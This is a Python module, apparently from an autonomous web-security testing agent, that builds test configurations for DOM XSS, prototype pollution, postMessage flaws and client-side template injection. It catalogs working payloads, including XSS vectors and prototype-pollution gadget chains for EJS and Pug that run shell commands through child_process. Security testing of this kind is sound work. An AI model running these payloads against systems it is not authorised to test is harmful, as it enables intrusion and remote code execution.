"""DOM Analyzer - Client-side vulnerability detection for Project Triage v4.

Implements the DOM Invader canary method for detecting DOM XSS:
1. Inject unique canary into each source (hash, query, postMessage, etc.)
2. Check if canary appears in any dangerous sink
3. Escalate with context-appropriate XSS payload

Also detects: prototype pollution entry points, postMessage handlers
without origin validation, DOM clobbering vectors, and CSTI patterns.

Research basis: R4.1 - DOM Invader methodology, Playwright security testing.
"""

from __future__ import annotations

import re
import secrets
from dataclasses import dataclass, field
from typing import Any


@dataclass
class DOMSource:
    """A DOM source that reads attacker-controlled data."""
    name: str
    tier: int  # 1=highest attacker control, 2=moderate
    injection_method: str  # how to inject (url_hash, query_param, etc.)
    description: str = ""


@dataclass
class DOMSink:
    """A DOM sink that can lead to code execution."""
    name: str
    tier: int  # 1=direct execution, 2=context-dependent
    escalation_payload: str  # XSS payload matched to this sink
    description: str = ""


@dataclass
class DOMVuln:
    """A detected DOM vulnerability (source-sink pair)."""
    source: str
    sink: str
    canary_found: bool
    escalation_possible: bool
    payload: str
    url: str
    severity: str
    description: str = ""


# ---------------------------------------------------------------------------
# Source and sink catalogs
# ---------------------------------------------------------------------------

SOURCES: list[DOMSource] = [
    DOMSource("location.hash", 1, "url_hash", "Fragment - never sent to server"),
    DOMSource("location.search", 1, "query_param", "URL query string"),
    DOMSource("location.href", 1, "url_full", "Full URL including all components"),
    DOMSource("document.URL", 1, "url_full", "Alias for location.href"),
    DOMSource("document.referrer", 1, "referrer", "Controllable via link navigation"),
    DOMSource("window.name", 1, "window_name", "Cross-origin writable, persists across navigation"),
    DOMSource("postMessage", 1, "post_message", "Cross-origin messaging"),
    DOMSource("localStorage", 2, "storage", "Stored source - requires prior write"),
    DOMSource("sessionStorage", 2, "storage", "Stored source - session scoped"),
    DOMSource("document.cookie", 2, "cookie", "Requires cookie injection vector"),
    DOMSource("WebSocket.onmessage", 2, "websocket", "Real-time data channel"),
]

SINKS: list[DOMSink] = [
    # Tier 1: Direct code execution
    DOMSink("eval()", 1, "'-alert(1)-'", "Direct JS execution"),
    DOMSink("Function()", 1, "alert(1)", "Constructor-based execution"),
    DOMSink("setTimeout(string)", 1, "alert(1)", "Timer-based execution"),
    DOMSink("setInterval(string)", 1, "alert(1)", "Timer-based execution"),
    DOMSink("document.write()", 1, "<img src=x onerror=alert(1)>", "DOM write"),
    DOMSink("innerHTML", 1, "<img src=x onerror=alert(1)>", "HTML injection"),
    DOMSink("outerHTML", 1, "<img src=x onerror=alert(1)>", "HTML injection"),
    DOMSink("insertAdjacentHTML()", 1, "<img src=x onerror=alert(1)>", "HTML injection"),
    DOMSink("$.html()", 1, "<img src=x onerror=alert(1)>", "jQuery HTML sink"),
    DOMSink("$().append()", 1, "<img src=x onerror=alert(1)>", "jQuery append sink"),
    DOMSink("$(user_input)", 1, "<img src=x onerror=alert(1)>", "jQuery selector sink"),
    # Tier 2: Context-dependent
    DOMSink("location.href=", 2, "javascript:alert(1)", "Navigation sink"),
    DOMSink("location.assign()", 2, "javascript:alert(1)", "Navigation sink"),
    DOMSink("location.replace()", 2, "javascript:alert(1)", "Navigation sink"),
    DOMSink("element.src=", 2, "javascript:alert(1)", "Script/iframe src"),
    DOMSink("setAttribute('href')", 2, "javascript:alert(1)", "Link href injection"),
    DOMSink("window.open()", 2, "javascript:alert(1)", "New window with JS URI"),
]


# ---------------------------------------------------------------------------
# Prototype pollution patterns
# ---------------------------------------------------------------------------

PP_ENTRY_PATTERNS: list[dict[str, Any]] = [
    {
        "name": "json_merge",
        "description": "JSON body merged into object without __proto__ filtering",
        "test_payloads": [
            '{"__proto__": {"polluted": "true"}}',
            '{"constructor": {"prototype": {"polluted": "true"}}}',
        ],
        "detection": "Check if subsequent response contains 'polluted' property",
    },
    {
        "name": "query_param_merge",
        "description": "Query parameters parsed and merged (qs, querystring)",
        "test_payloads": [
            "__proto__[polluted]=true",
            "constructor[prototype][polluted]=true",
            "__proto__.polluted=true",
        ],
        "detection": "Check response for injected property",
    },
    {
        "name": "url_path_segment",
        "description": "URL path used as object key in routing/middleware",
        "test_payloads": [
            "/__proto__/polluted",
            "/constructor/prototype/polluted",
        ],
        "detection": "Check for changed application behavior",
    },
]

# Blind SSPP detection techniques
SSPP_BLIND_PROBES: list[dict[str, Any]] = [
    {
        "name": "status_code_probe",
        "payload": '{"__proto__": {"status": 510}}',
        "detection": "Response status changes to 510",
        "severity": "critical",
    },
    {
        "name": "json_spaces_probe",
        "payload": '{"__proto__": {"json spaces": 1}}',
        "detection": "JSON responses become pretty-printed",
        "severity": "critical",
    },
    {
        "name": "charset_probe",
        "payload": '{"__proto__": {"content-type": "application/json; charset=utf-7"}}',
        "detection": "Content-Type header includes injected charset",
        "severity": "high",
    },
    {
        "name": "cache_control_probe",
        "payload": '{"__proto__": {"cache-control": "no-cache"}}',
        "detection": "Previously cached responses stop being cached",
        "severity": "high",
    },
]

# SSPP to RCE gadget chains
SSPP_GADGETS: list[dict[str, Any]] = [
    {
        "name": "ejs_outputFunctionName",
        "template_engine": "ejs",
        "payload": '{"__proto__": {"outputFunctionName": "x;process.mainModule.require(\'child_process\').execSync(\'id\');x"}}',
        "severity": "critical",
        "description": "EJS reads outputFunctionName from prototype, injects into compiled template",
    },
    {
        "name": "ejs_escapeFunction",
        "template_engine": "ejs",
        "payload": '{"__proto__": {"client": true, "escapeFunction": "1;return global.process.mainModule.require(\'child_process\').execSync(\'id\')//"}}',
        "severity": "critical",
        "description": "EJS client mode + escapeFunction pollution = RCE",
    },
    {
        "name": "pug_block",
        "template_engine": "pug",
        "payload": '{"__proto__": {"block": {"type": "Text", "val": "process.mainModule.require(\'child_process\').execSync(\'id\')"}}}',
        "severity": "critical",
        "description": "Pug block property pollution leads to code generation injection",
    },
    {
        "name": "handlebars_allowProtoProperties",
        "template_engine": "handlebars",
        "payload": '{"__proto__": {"allowProtoPropertiesByDefault": true}}',
        "severity": "high",
        "description": "Handlebars prototype access control bypass",
    },
]


# ---------------------------------------------------------------------------
# PostMessage patterns
# ---------------------------------------------------------------------------

POSTMESSAGE_VULN_PATTERNS: list[dict[str, Any]] = [
    {
        "name": "no_origin_check",
        "description": "addEventListener('message', handler) without checking event.origin",
        "detection_regex": r"addEventListener\s*\(\s*['\"]message['\"].*?function.*?\{(?!.*?origin)",
        "severity": "high",
    },
    {
        "name": "weak_origin_check",
        "description": "Origin check using indexOf or includes (bypassable with subdomain)",
        "detection_regex": r"event\.origin\s*\.\s*(indexOf|includes)\s*\(",
        "severity": "medium",
    },
    {
        "name": "eval_on_message",
        "description": "postMessage data passed to eval/Function/innerHTML",
        "detection_regex": r"(eval|Function|innerHTML)\s*[\(=].*?(event\.data|e\.data|msg\.data)",
        "severity": "critical",
    },
]


# ---------------------------------------------------------------------------
# CSTI patterns
# ---------------------------------------------------------------------------

CSTI_PATTERNS: list[dict[str, Any]] = [
    {
        "framework": "angular",
        "test_payload": "{{7*7}}",
        "success_indicator": "49",
        "escalation": "{{constructor.constructor('return this')().alert(1)}}",
    },
    {
        "framework": "vue",
        "test_payload": "{{7*7}}",
        "success_indicator": "49",
        "escalation": "{{_c.constructor('alert(1)')()}}",
    },
    {
        "framework": "moustache/handlebars",
        "test_payload": "{{7*7}}",
        "success_indicator": "49",
        "escalation": "{{#with 'constructor'}}{{this.call(this,'alert(1)')()}}{{/with}}",
    },
]


# ---------------------------------------------------------------------------
# Main class
# ---------------------------------------------------------------------------

class DOMAnalyzer:
    """DOM vulnerability analyzer for autonomous testing.

    Generates test configurations and hypotheses. Actual browser
    execution happens via the agent's tool system.
    """

    @staticmethod
    def generate_canary() -> str:
        """Generate a unique alphanumeric canary for source-sink tracing."""
        return "zq" + secrets.token_hex(5)

    def get_dom_xss_tests(self, url: str) -> list[dict[str, Any]]:
        """Generate DOM XSS test configurations for each source.

        Returns test configs that the agent's browser tool should execute.
        """
        canary = self.generate_canary()
        tests = []

        for source in SOURCES:
            if source.tier > 2:
                continue

            test = {
                "url": url,
                "source": source.name,
                "injection_method": source.injection_method,
                "canary": canary,
                "sinks_to_check": [s.name for s in SINKS],
                "description": f"Inject canary '{canary}' via {source.name}, check all sinks",
            }

            # Build injected URL based on source type
            if source.injection_method == "url_hash":
                test["injected_url"] = f"{url}#{canary}"
            elif source.injection_method == "query_param":
                sep = "&" if "?" in url else "?"
                test["injected_url"] = f"{url}{sep}q={canary}"
            elif source.injection_method == "url_full":
                test["injected_url"] = f"{url}?{canary}"
            else:
                test["injected_url"] = url

            tests.append(test)

        return tests

    def get_pp_tests(self, url: str) -> list[dict[str, Any]]:
        """Generate prototype pollution test configurations."""
        tests = []

        # Client-side PP via URL parameters
        for entry in PP_ENTRY_PATTERNS:
            for payload in entry["test_payloads"]:
                tests.append({
                    "url": url,
                    "type": "client_pp",
                    "entry_point": entry["name"],
                    "payload": payload,
                    "detection": entry["detection"],
                    "description": f"PP test: {entry['name']} with {payload[:50]}",
                })

        # Server-side PP blind probes
        for probe in SSPP_BLIND_PROBES:
            tests.append({
                "url": url,
                "type": "server_pp",
                "entry_point": "json_body",
                "payload": probe["payload"],
                "detection": probe["detection"],
                "severity": probe["severity"],
                "description": f"SSPP blind probe: {probe['name']}",
            })

        return tests

    def get_postmessage_tests(self, url: str) -> list[dict[str, Any]]:
        """Generate postMessage vulnerability tests."""
        return [
            {
                "url": url,
                "type": "postmessage",
                "pattern": p["name"],
                "description": p["description"],
                "detection_regex": p["detection_regex"],
                "severity": p["severity"],
            }
            for p in POSTMESSAGE_VULN_PATTERNS
        ]

    def get_csti_tests(self, url: str) -> list[dict[str, Any]]:
        """Generate client-side template injection tests."""
        return [
            {
                "url": url,
                "type": "csti",
                "framework": p["framework"],
                "test_payload": p["test_payload"],
                "success_indicator": p["success_indicator"],
                "escalation": p["escalation"],
                "description": f"CSTI test for {p['framework']}",
            }
            for p in CSTI_PATTERNS
        ]

    def generate_hypotheses(self, url: str, tech_stack: dict[str, Any]) -> list[dict[str, Any]]:
        """Generate DOM-related hypotheses based on tech stack."""
        hypotheses = []
        framework = str(tech_stack.get("framework", "")).lower()

        # Always test DOM XSS (framework-agnostic)
        hypotheses.append({
            "endpoint": url,
            "technique": "dom_xss_canary",
            "description": "DOM XSS via canary injection - test all sources against all sinks",
            "novelty": 7, "exploitability": 8, "impact": 7, "effort": 3,
        })

        # PP tests based on tech stack
        if any(t in framework for t in ["node", "express", "next", "nuxt", "react"]):
            hypotheses.append({
                "endpoint": url,
                "technique": "server_prototype_pollution",
                "description": "Server-side prototype pollution blind probes (status, json spaces, charset)",
                "novelty": 8, "exploitability": 8, "impact": 10, "effort": 3,
            })

        # Template engine gadgets
        for gadget in SSPP_GADGETS:
            if gadget["template_engine"] in framework:
                hypotheses.append({
                    "endpoint": url,
                    "technique": f"sspp_rce_{gadget['name']}",
                    "description": f"SSPP to RCE via {gadget['template_engine']} gadget: {gadget['name']}",
                    "novelty": 9, "exploitability": 9, "impact": 10, "effort": 4,
                })

        # PostMessage (always test)
        hypotheses.append({
            "endpoint": url,
            "technique": "postmessage_hijack",
            "description": "PostMessage handler without origin validation - test for data exfil/XSS",
            "novelty": 7, "exploitability": 7, "impact": 8, "effort": 3,
        })

        # CSTI based on framework
        for csti in CSTI_PATTERNS:
            if csti["framework"].split("/")[0] in framework:
                hypotheses.append({
                    "endpoint": url,
                    "technique": f"csti_{csti['framework']}",
                    "description": f"Client-side template injection for {csti['framework']}",
                    "novelty": 8, "exploitability": 8, "impact": 8, "effort": 3,
                })

        return hypotheses
